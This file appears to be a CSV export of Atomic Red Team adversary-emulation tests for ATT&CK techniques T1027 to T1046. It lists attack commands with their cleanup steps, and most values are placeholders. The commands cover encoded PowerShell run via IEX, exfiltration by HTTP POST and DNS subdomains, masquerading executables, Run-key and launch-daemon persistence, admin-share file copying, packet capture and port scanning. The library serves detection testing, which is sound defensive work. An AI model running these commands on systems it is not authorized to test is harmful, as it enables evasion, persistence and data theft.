"File","AtomicTest","Command","Cleanup"
"C:\AtomicRedTeam\atomics\T1027\T1027.yaml","Decode base64 Data into Script","if [ ""$(uname)"" = 'FreeBSD' ]; then cmd=""b64decode -r""; else cmd=""base64 -d""; fi;
cat /tmp/encoded.dat | $cmd > /tmp/art.sh
chmod +x /tmp/art.sh
/tmp/art.sh
","rm /tmp/encoded.dat 
rm /tmp/art.sh
"
"C:\AtomicRedTeam\atomics\T1027\T1027.yaml","Execute base64-encoded PowerShell","$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand
powershell.exe -EncodedCommand $EncodedCommand
",
"C:\AtomicRedTeam\atomics\T1027\T1027.yaml","Execute base64-encoded PowerShell from Windows Registry","$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
powershell.exe -Command ""IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))""
","Remove-ItemProperty -Force -ErrorAction Ignore -Path #{registry_key_storage} -Name #{registry_entry_storage}
"
"C:\AtomicRedTeam\atomics\T1027\T1027.yaml","Execution from Compressed File","""PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe""
","taskkill /f /im calculator.exe >nul 2>nul
taskkill /f /im CalculatorApp.exe >nul 2>nul
"
"C:\AtomicRedTeam\atomics\T1027\T1027.yaml","DLP Evasion via Sensitive Data in VBA Macro over email","Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments ""#{input_file}"" -SmtpServer #{smtp_server}
",
"C:\AtomicRedTeam\atomics\T1027\T1027.yaml","DLP Evasion via Sensitive Data in VBA Macro over HTTP","Invoke-WebRequest -Uri #{ip_address} -Method POST -Body ""#{input_file}""
",
"C:\AtomicRedTeam\atomics\T1027\T1027.yaml","Obfuscated Command Line using special Unicode characters",,
"C:\AtomicRedTeam\atomics\T1027\T1027.yaml","Execution from Compressed JScript File","""PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\T1027js.js""
","taskkill /f /im calculator.exe >nul 2>nul
"
"C:\AtomicRedTeam\atomics\T1027.001\T1027.001.yaml","Pad Binary to Change Hash - Linux/macOS dd","dd if=/dev/zero bs=1 count=1 >> #{file_to_pad} #adds null bytes
dd if=/dev/random bs=1 count=1 >> #{file_to_pad} #adds high-quality random data
dd if=/dev/urandom bs=1 count=1 >> #{file_to_pad} #adds low-quality random data
","rm #{file_to_pad}
"
"C:\AtomicRedTeam\atomics\T1027.001\T1027.001.yaml","Pad Binary to Change Hash using truncate command - Linux/macOS","truncate -s +1 #{file_to_pad} #adds a byte to the file size
","rm #{file_to_pad}
"
"C:\AtomicRedTeam\atomics\T1027.002\T1027.002.yaml","Binary simply packed by UPX (linux)","cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
","rm /tmp/packed_bin
"
"C:\AtomicRedTeam\atomics\T1027.002\T1027.002.yaml","Binary packed by UPX, with modified headers (linux)","cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
","rm /tmp/packed_bin
"
"C:\AtomicRedTeam\atomics\T1027.002\T1027.002.yaml","Binary simply packed by UPX","cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
","rm /tmp/packed_bin
"
"C:\AtomicRedTeam\atomics\T1027.002\T1027.002.yaml","Binary packed by UPX, with modified headers","cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
","rm /tmp/packed_bin
"
"C:\AtomicRedTeam\atomics\T1027.004\T1027.004.yaml","Compile After Delivery using csc.exe","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:#{output_file} ""#{input_file}""
","del #{output_file} >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1027.004\T1027.004.yaml","Dynamic C# Compile","Invoke-Expression ""#{input_file}""
",
"C:\AtomicRedTeam\atomics\T1027.004\T1027.004.yaml","C compile","gcc #{input_file} && ./a.out
clang #{input_file} && ./a.out
",
"C:\AtomicRedTeam\atomics\T1027.004\T1027.004.yaml","CC compile","g++ #{input_file} && ./a.out
clang++ #{input_file} && ./a.out
",
"C:\AtomicRedTeam\atomics\T1027.004\T1027.004.yaml","Go compile","go run #{input_file}
",
"C:\AtomicRedTeam\atomics\T1027.007\T1027.007.yaml","Dynamic API Resolution-Ninja-syscall","Start-Process ""#{exe_binary}""
Start-Sleep -Seconds 7
if (Test-Path ""C:\Users\Default\AppData\Local\Temp\hello.log"") { Remove-Item ""C:\Users\Default\AppData\Local\Temp\hello.log"" -Force; Write-Host ""[+] hello.log removed."" }
","if (Test-Path ""C:\Users\Default\AppData\Local\Temp\hello.log"") { Remove-Item ""C:\Users\Default\AppData\Local\Temp\hello.log"" -Force; Write-Host ""[+] hello.log removed."" }"
"C:\AtomicRedTeam\atomics\T1027.013\T1027.013.yaml","Password-Protected ZIP Payload Extraction and Execution","echo '#!/bin/bash' > /tmp/art_payload.sh
echo 'echo ""T1027.013: Payload extracted from encrypted ZIP""' >> /tmp/art_payload.sh
echo 'echo ""Hostname: $(hostname)""' >> /tmp/art_payload.sh
echo 'echo ""User: $(whoami)""' >> /tmp/art_payload.sh
echo 'uname -a' >> /tmp/art_payload.sh
cd /tmp && zip -P ""#{zip_password}"" art_encrypted.zip art_payload.sh
rm /tmp/art_payload.sh
echo ""Encrypted ZIP created. Extracting with password...""
unzip -P ""#{zip_password}"" -o /tmp/art_encrypted.zip -d /tmp/
echo ""Executing extracted payload:""
bash /tmp/art_payload.sh
","rm -f /tmp/art_payload.sh
rm -f /tmp/art_encrypted.zip
"
"C:\AtomicRedTeam\atomics\T1030\T1030.yaml","Data Transfer Size Limits","cd #{folder_path}; split -b 5000000 #{file_name}
ls -l #{folder_path}
","if [ -f #{folder_path}/safe_to_delete ]; then rm -rf #{folder_path}; fi;
"
"C:\AtomicRedTeam\atomics\T1030\T1030.yaml","Network-Based Data Transfer in Small Chunks","$file = [System.IO.File]::OpenRead(#{source_file_path})
$chunkSize = #{chunk_size} * 1KB
$buffer = New-Object Byte[] $chunkSize

while ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {
    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)
    Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk
}
$file.Close()
",
"C:\AtomicRedTeam\atomics\T1033\T1033.yaml","System Owner/User Discovery","cmd.exe /C whoami
wmic useraccount get /ALL
quser /SERVER:""#{computer_name}""
quser
qwinsta.exe /server:#{computer_name}
qwinsta.exe
for /F ""tokens=1,2"" %i in ('qwinsta /server:#{computer_name} ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt
@FOR /F %n in (computers.txt) DO @FOR /F ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt
",
"C:\AtomicRedTeam\atomics\T1033\T1033.yaml","System Discovery - SocGholish whoami","$TokenSet = @{
  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
  N = [Char[]]'0123456789'
}
$Upper = Get-Random -Count 5 -InputObject $TokenSet.U
$Number = Get-Random -Count 5 -InputObject $TokenSet.N
$StringSet = $Upper + $Number
$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''
$file = ""rad"" + $rad + "".tmp""

whoami.exe /all >> #{output_path}\$file
","Remove-Item -Path #{output_path}\rad*.tmp -Force
"
"C:\AtomicRedTeam\atomics\T1033\T1033.yaml","System Owner/User Discovery Using Command Prompt","set file=#{output_file_path}\user_info_%random%.tmp
echo Username: %USERNAME% > %file%
echo User Domain: %USERDOMAIN% >> %file%
net users >> %file%
query user >> %file%
","del #{output_file_path}\\user_info_*.tmp
"
"C:\AtomicRedTeam\atomics\T1036\T1036.yaml","Malware Masquerading and Execution from Zip File","Expand-Archive -Path ""PathToAtomicsFolder\..\ExternalPayloads\T1036.zip"" -DestinationPath ""$env:userprofile\Downloads\T1036"" -Force
cd ""$env:userprofile\Downloads\T1036""
cmd /c ""$env:userprofile\Downloads\T1036\README.cmd"" >$null 2>$null","taskkill /IM Calculator.exe /f >$null 2>$null
Remove-Item ""$env:userprofile\Downloads\T1036"" -recurse -ErrorAction Ignore"
"C:\AtomicRedTeam\atomics\T1036.003\T1036.003.yaml","Masquerading - non-windows exe running as windows exe","copy ""#{inputfile}"" #{outputfile}
try { $myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id }
catch { $_; exit $_.Exception.HResult}
Stop-Process -ID $myT1036_003
","Remove-Item #{outputfile} -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1036.003\T1036.003.yaml","Masquerading - windows exe running as different windows exe","copy ""#{inputfile}"" #{outputfile}
$myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id
Stop-Process -ID $myT1036_003
","Remove-Item #{outputfile} -Force -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1036.004\T1036.004.yaml","linux rename /proc/pid/comm using prctl","#{exe_path} & ps
TMP=`ps | grep totally_legit`
if [ -z ""${TMP}"" ] ; then echo ""renamed process NOT FOUND in process list"" && exit 1; fi
exit 0
","rm -f #{exe_path}
"
"C:\AtomicRedTeam\atomics\T1036.005\T1036.005.yaml","Execute a process from a directory masquerading as the current parent directory","mkdir $HOME/...
cp $(which sh) $HOME/...
$HOME/.../sh -c ""echo #{test_message}""
","rm -f $HOME/.../sh
rmdir $HOME/.../
"
"C:\AtomicRedTeam\atomics\T1036.005\T1036.005.yaml","Masquerade as a built-in system executable","Add-Type -TypeDefinition @'
public class Test {
    public static void Main(string[] args) {
        System.Console.WriteLine(""tweet, tweet"");
    }
}
'@ -OutputAssembly ""#{executable_filepath}""

Start-Process -FilePath ""#{executable_filepath}""
","Remove-Item -Path ""#{executable_filepath}"" -ErrorAction Ignore
"
"C:\AtomicRedTeam\atomics\T1036.005\T1036.005.yaml","Masquerading cmd.exe as VEDetector.exe","# Copy and rename cmd.exe to VEDetector.exe
Copy-Item -Path ""#{source_file}"" -Destination ""#{ved_path}\VEDetector.exe"" -Force

# Create registry run key for persistence
New-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"" -Name ""VEDetector"" -Value ""#{ved_path}\VEDetector.exe"" -PropertyType String -Force

# Start the renamed process
Start-Process -FilePath ""#{ved_path}\VEDetector.exe""

Start-Sleep -Seconds 5
","# Remove registry key
Remove-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"" -Name ""VEDetector"" -ErrorAction SilentlyContinue

# Stop the process
Stop-Process -Name ""VEDetector"" -Force -ErrorAction SilentlyContinue

# Remove the file
Remove-Item -Path ""#{ved_path}\VEDetector.exe"" -Force -ErrorAction SilentlyContinue

Write-Host ""[+] Cleaned up VEDetector artifacts""
"
"C:\AtomicRedTeam\atomics\T1036.007\T1036.007.yaml","File Extension Masquerading","copy ""#{exe_path}"" %temp%\T1036.007_masquerading.docx.exe /Y
copy ""#{exe_path}"" %temp%\T1036.007_masquerading.pdf.exe /Y
copy ""#{exe_path}"" %temp%\T1036.007_masquerading.ps1.exe /Y
copy ""#{vbs_path}"" %temp%\T1036.007_masquerading.xls.vbs /Y
copy ""#{vbs_path}"" %temp%\T1036.007_masquerading.xlsx.vbs /Y
copy ""#{vbs_path}"" %temp%\T1036.007_masquerading.png.vbs /Y
copy ""#{ps1_path}"" %temp%\T1036.007_masquerading.doc.ps1 /Y
copy ""#{ps1_path}"" %temp%\T1036.007_masquerading.pdf.ps1 /Y
copy ""#{ps1_path}"" %temp%\T1036.007_masquerading.rtf.ps1 /Y
%temp%\T1036.007_masquerading.docx.exe
%temp%\T1036.007_masquerading.pdf.exe
%temp%\T1036.007_masquerading.ps1.exe
%temp%\T1036.007_masquerading.xls.vbs
%temp%\T1036.007_masquerading.xlsx.vbs
%temp%\T1036.007_masquerading.png.vbs
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.doc.ps1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.pdf.ps1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.007_masquerading.rtf.ps1
","del /f %temp%\T1036.007_masquerading.docx.exe > nul 2>&1
del /f %temp%\T1036.007_masquerading.pdf.exe > nul 2>&1
del /f %temp%\T1036.007_masquerading.ps1.exe > nul 2>&1
del /f %temp%\T1036.007_masquerading.xls.vbs > nul 2>&1
del /f %temp%\T1036.007_masquerading.xlsx.vbs > nul 2>&1
del /f %temp%\T1036.007_masquerading.png.vbs > nul 2>&1
del /f %temp%\T1036.007_masquerading.doc.ps1 > nul 2>&1
del /f %temp%\T1036.007_masquerading.pdf.ps1 > nul 2>&1
del /f %temp%\T1036.007_masquerading.rtf.ps1 > nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1037.001\T1037.001.yaml","Logon Scripts","echo ""#{script_command}"" > #{script_path}
REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d ""#{script_path}"" /f
","REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f >nul 2>&1
del #{script_path} >nul 2>&1
del ""%USERPROFILE%\desktop\T1037.001-log.txt"" >nul 2>&1
"
"C:\AtomicRedTeam\atomics\T1037.005\T1037.005.yaml","Add launch script to launch daemon","sudo cp #{path_startup_params} /Library/StartupItems/StartupParameters.plist
sudo cp #{path_malicious_script} /Library/StartupItems/atomic.sh
sudo cp #{path_malicious_plist} /tmp/T1037_005_daemon.plist
sudo /Library/StartupItems/atomic.sh start
","sudo launchctl unload /tmp/T1037_005_daemon.plist
sudo rm /tmp/T1037_005_daemon.plist
sudo rm /Library/StartupItems/atomic.sh
sudo rm /Library/StartupItems/StartupParameters.plist
sudo rm /tmp/T1037_005_daemon.txt
"
"C:\AtomicRedTeam\atomics\T1037.005\T1037.005.yaml","Add launch script to launch agent","sudo cp #{path_startup_params} /Library/StartupItems/StartupParameters.plist
sudo cp #{path_malicious_script} /Library/StartupItems/atomic.sh
sudo cp #{path_malicious_plist} /tmp/T1037_005_agent.plist
/Library/StartupItems/atomic.sh start
","sudo launchctl unload /tmp/T1037_005_agent.plist
sudo rm /tmp/T1037_005_agent.plist
sudo rm /Library/StartupItems/atomic.sh
sudo rm /Library/StartupItems/StartupParameters.plist
sudo rm /tmp/T1037_005_agent.txt
"
"C:\AtomicRedTeam\atomics\T1039\T1039.yaml","Copy a sensitive File over Administrative share with copy","copy \\#{remote}\C$\#{share_file} %TEMP%\#{local_file}","del \\#{remote}\C$\#{share_file}
del %TEMP%\#{local_file}"
"C:\AtomicRedTeam\atomics\T1039\T1039.yaml","Copy a sensitive File over Administrative share with Powershell","copy-item -Path ""\\#{remote}\C$\#{share_file}"" -Destination ""$Env:TEMP\#{local_file}""","Remove-Item -Path ""\\#{remote}\C$\#{share_file}""
Remove-Item -Path ""$Env:TEMP\#{local_file}"""
"C:\AtomicRedTeam\atomics\T1040\T1040.yaml","Packet Capture Linux using tshark or tcpdump","tcpdump -c 5 -nnni #{interface}
tshark -c 5 -i #{interface}
",
"C:\AtomicRedTeam\atomics\T1040\T1040.yaml","Packet Capture FreeBSD using tshark or tcpdump","tcpdump -c 5 -nnni #{interface}
tshark -c 5 -i #{interface}
",
"C:\AtomicRedTeam\atomics\T1040\T1040.yaml","Packet Capture macOS using tcpdump or tshark","sudo tcpdump -c 5 -nnni #{interface}    
if [ -x ""$(command -v tshark)"" ]; then sudo tshark -c 5 -i #{interface}; fi;
",
"C:\AtomicRedTeam\atomics\T1040\T1040.yaml","Packet Capture Windows Command Prompt","""c:\Program Files\Wireshark\tshark.exe"" -i #{interface} -c 5
",
"C:\AtomicRedTeam\atomics\T1040\T1040.yaml","Packet Capture macOS using /dev/bpfN with sudo","sudo #{program_path} -i #{ifname} -t 3
","rm -f #{program_path}
"
"C:\AtomicRedTeam\atomics\T1040\T1040.yaml","Filtered Packet Capture macOS using /dev/bpfN with sudo","sudo #{program_path} -f -i #{ifname} -t 3
","rm -f #{program_path}
"
"C:\AtomicRedTeam\atomics\T1040\T1040.yaml","Packet Capture FreeBSD using /dev/bpfN with sudo","sudo #{program_path} -i #{ifname} -t 3
","rm -f #{program_path}
"
"C:\AtomicRedTeam\atomics\T1040\T1040.yaml","Filtered Packet Capture FreeBSD using /dev/bpfN with sudo","sudo #{program_path} -f -i #{ifname} -t 3
","rm -f #{program_path}
"
"C:\AtomicRedTeam\atomics\T1040\T1040.yaml","Packet Capture Linux socket AF_PACKET,SOCK_RAW with sudo","sudo #{program_path} -a -t 3
","rm -f #{program_path}
"
"C:\AtomicRedTeam\atomics\T1040\T1040.yaml","Packet Capture Linux socket AF_INET,SOCK_RAW,TCP with sudo","sudo #{program_path} -4 -p 6 -t 3
","rm -f #{program_path}
"
"C:\AtomicRedTeam\atomics\T1040\T1040.yaml","Packet Capture Linux socket AF_INET,SOCK_PACKET,UDP with sudo","sudo #{program_path} -4 -P -p 17 -t 3
","rm -f #{program_path}
"
"C:\AtomicRedTeam\atomics\T1040\T1040.yaml","Packet Capture Linux socket AF_PACKET,SOCK_RAW with BPF filter for UDP with sudo","sudo #{program_path} -a -f -t 3
","rm -f #{program_path}
"
"C:\AtomicRedTeam\atomics\T1041\T1041.yaml","C2 Data Exfiltration","if(-not (Test-Path #{filepath})){ 
  1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value ""This is line $_."" }
}
[System.Net.ServicePointManager]::Expect100Continue = $false
$filecontent = Get-Content -Path #{filepath}
Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $filecontent -DisableKeepAlive
",
"C:\AtomicRedTeam\atomics\T1041\T1041.yaml","Text Based Data Exfiltration using DNS subdomains","$dnsServer = ""#{dns_server}""
$exfiltratedData = ""#{exfiltrated_data}""
$chunkSize = #{chunk_size}

$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)
$encodedData = [Convert]::ToBase64String($encodedData)
$chunks = $encodedData -split ""(.{$chunkSize})""

foreach ($chunk in $chunks) {
    $dnsQuery = $chunk + ""."" + $dnsServer
    Resolve-DnsName -Name $dnsQuery
    Start-Sleep -Seconds 5
}
",
"C:\AtomicRedTeam\atomics\T1046\T1046.yaml","Port Scan","for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done
",
"C:\AtomicRedTeam\atomics\T1046\T1046.yaml","Port Scan Nmap","sudo nmap -sS #{network_range} -p #{port}
telnet #{host} #{port}
nc -nv #{host} #{port}
",
"C:\AtomicRedTeam\atomics\T1046\T1046.yaml","Port Scan NMap for Windows","nmap #{host_to_scan}",
"C:\AtomicRedTeam\atomics\T1046\T1046.yaml","Port Scan using python","python ""#{filename}"" -i #{host_ip}
",
"C:\AtomicRedTeam\atomics\T1046\T1046.yaml","Port-Scanning /24 Subnet with PowerShell","$ipAddr = ""#{ip_address}""
if ($ipAddr -like ""*,*"") {
    $ip_list = $ipAddr -split "",""
    $ip_list = $ip_list.ForEach({ $_.Trim() })
    Write-Host ""[i] IP Address List: $ip_list""

    $ports = #{port_list}

    foreach ($ip in $ip_list) {
        foreach ($port in $ports) {
            Write-Host ""[i] Establishing connection to: $ip : $port""
            try {
                $tcp = New-Object Net.Sockets.TcpClient
                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null
            } catch {}
            if ($tcp.Connected) {
                $tcp.Close()
                Write-Host ""Port $port is open on $ip""
            }
        }
    }
} elseif ($ipAddr -notlike ""*,*"") {
    if ($ipAddr -eq """") {
        # Assumes the ""primary"" interface is shown at the top
        $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1
        Write-Host ""[i] Using Interface $interface""
        $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress
    }
    Write-Host ""[i] Base IP-Address for Subnet: $ipAddr""
    $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)
    # Always assumes /24 subnet
    Write-Host ""[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'""

    $ports = #{port_list}
    $subnetIPs = 1..254 | ForEach-Object { ""$subnetSubstring$_"" }

    foreach ($ip in $subnetIPs) {
        foreach ($port in $ports) {
            try {
                $tcp = New-Object Net.Sockets.TcpClient
                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null
            } catch {}
            if ($tcp.Connected) {
                $tcp.Close()
                Write-Host ""Port $port is open on $ip""
            }
        }
    }
} else {
    Write-Host ""[Error] Invalid Inputs""
    exit 1
}",
